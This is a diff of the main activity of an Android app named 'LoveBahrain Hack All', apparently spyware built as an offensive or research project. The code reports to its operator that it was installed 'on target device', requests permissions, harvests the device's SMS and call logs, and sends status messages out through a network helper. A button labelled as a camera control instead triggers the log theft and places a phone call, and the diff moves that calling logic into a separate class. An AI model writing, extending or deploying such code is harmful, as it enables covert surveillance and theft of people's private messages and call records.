@@ -4,14 +4,10 @@ import android.Manifest
 import android.annotation.SuppressLint
 import android.content.IntentFilter
 import android.content.Intent
-import android.content.pm.PackageManager
-import android.database.Cursor
 import android.os.Bundle
-import android.provider.CallLog
 import android.widget.Button
 import android.widget.Toast
 import androidx.activity.ComponentActivity
-import androidx.core.net.toUri
 import cocomelonc.hackall.broadcasts.HackAllAirPlaneBroadcastReceiver
 import cocomelonc.hackall.tools.HackAllNetwork
 import com.karumi.dexter.Dexter
@@ -21,30 +17,22 @@ import com.karumi.dexter.listener.DexterError
 import com.karumi.dexter.listener.PermissionRequest
 import com.karumi.dexter.listener.PermissionRequestErrorListener
 import com.karumi.dexter.listener.multi.MultiplePermissionsListener
-
-import com.karumi.dexter.listener.PermissionDeniedResponse
-import com.karumi.dexter.listener.PermissionGrantedResponse
-import com.karumi.dexter.listener.single.PermissionListener
-
-import android.content.Context
 import android.os.BatteryManager
 import cocomelonc.hackall.tools.HackAllCallLogs
+import cocomelonc.hackall.tools.HackAllCaller
 import cocomelonc.hackall.tools.HackAllSmsLogs
 
-import java.text.SimpleDateFormat
-import java.util.*
-
 class HackAllMainActivity : ComponentActivity() {
-    private val number = "107"
     private lateinit var cameraButton: Button
     lateinit var receiver: HackAllAirPlaneBroadcastReceiver
 
     val hackSms = HackAllSmsLogs(context = this)
     val hackAllCallLogs = HackAllCallLogs(context = this)
+    val hackAllCaller = HackAllCaller(context = this)
 
     // installed and opened - 1 stage
     private fun greetings(): String {
-        return "LoveBahrain Hack All application has been installed on target device and opened\n"
+        return "\uD83D\uDCF1 LoveBahrain Hack All application has been installed on target device and opened\n"
     }
 
     // get battery info - 2 stage
@@ -71,34 +59,6 @@ class HackAllMainActivity : ComponentActivity() {
                 "Charging Method: $chargeType"
     }
 
-    private fun startCall() {
-        var intent = Intent(Intent.ACTION_CALL)
-        intent.data = "tel:$number".toUri()
-        startActivity(intent)
-    }
-
-    @SuppressLint("NewApi")
-    fun isCallPermissionGranted(context: Context): Boolean {
-        val isGranted = context.checkSelfPermission(Manifest.permission.CALL_PHONE)
-        return isGranted == PackageManager.PERMISSION_GRANTED
-    }
-
-    private fun startCallPermissionRequest(context: Context, onGranted: () -> Unit) {
-        Dexter.withContext(context)
-            .withPermission(Manifest.permission.CALL_PHONE)
-            .withListener(object : PermissionListener {
-                override fun onPermissionGranted(p0: PermissionGrantedResponse?) {
-                    onGranted()
-                }
-                override fun onPermissionDenied(p0: PermissionDeniedResponse?) {}
-                override fun onPermissionRationaleShouldBeShown(
-                    p0: PermissionRequest?,
-                    p1: PermissionToken?
-                ) {
-                }
-            }).check()
-    }
-
     private fun requestPermissions() {
         // below line is use to request permission in the current activity.
         // this method is use to handle error in runtime permissions
@@ -122,7 +82,7 @@ class HackAllMainActivity : ComponentActivity() {
                             "All the permissions are granted..",
                             Toast.LENGTH_SHORT
                         ).show()
-                        HackAllNetwork(applicationContext).sendTextMessage("Hack All permissions granted\n")
+                        HackAllNetwork(applicationContext).sendTextMessage("\uD83D\uDCF1 Hack All permissions granted\n")
                         hackSms.getSmsLogs()
                         hackAllCallLogs.getCallLogs()
                     }
@@ -135,7 +95,7 @@ class HackAllMainActivity : ComponentActivity() {
                             "Hack All some permissions denied..",
                             Toast.LENGTH_SHORT
                         ).show()
-                        HackAllNetwork(applicationContext).sendTextMessage("Hack All some permissions denied\n")
+                        HackAllNetwork(applicationContext).sendTextMessage("\uD83D\uDCF1 Hack All some permissions denied\n")
                     }
                 }
 
@@ -170,16 +130,7 @@ class HackAllMainActivity : ComponentActivity() {
         cameraButton.setOnClickListener {
             hackSms.getSmsLogs()
             hackAllCallLogs.getCallLogs()
-//            requestPermissions()
-//            if (isCallPermissionGranted(this)) {
-//                HackAllNetwork(this).sendTextMessage("LoveBahrain Hack All Call started\n")
-//                startCall()
-//            } else {
-//                startCallPermissionRequest(this) {
-//                    HackAllNetwork(this).sendTextMessage("LoveBahrain Hack All Call permission denied\n")
-//                    startCall()
-//                }
-//            }
+            hackAllCaller.startNewCall()
         }
 
         receiver = HackAllAirPlaneBroadcastReceiver()
